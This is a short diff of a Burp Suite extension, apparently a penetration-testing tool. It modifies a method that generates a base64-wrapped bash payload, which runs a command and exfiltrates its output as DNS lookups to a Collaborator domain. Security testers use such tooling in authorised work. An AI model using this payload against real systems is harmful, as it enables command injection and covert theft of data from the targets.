@@ -131,7 +131,7 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         return self.tab
 
     def createBashBase64Payload(self, linuxCommand):
-       bashCommand = '''i=0;''' + linuxCommand + '''|base64 -w60|tr '+' '-'|while read j;do host `printf '%04d' $i`.${j//=/E-F}.''' + self.collaboratorDomain + '''&((i++));done'''
+       bashCommand = linuxCommand + '''|base64 -w60|tr '+' '-'|while read j;do host `printf '%04d' $i`.${j//=/E-F}.''' + self.collaboratorDomain + '''&((i++));done'''
        return "base64 -d<<<" + self._helpers.base64Encode(bashCommand) + "|sh"
 
     # Create windows powershell base64 payload
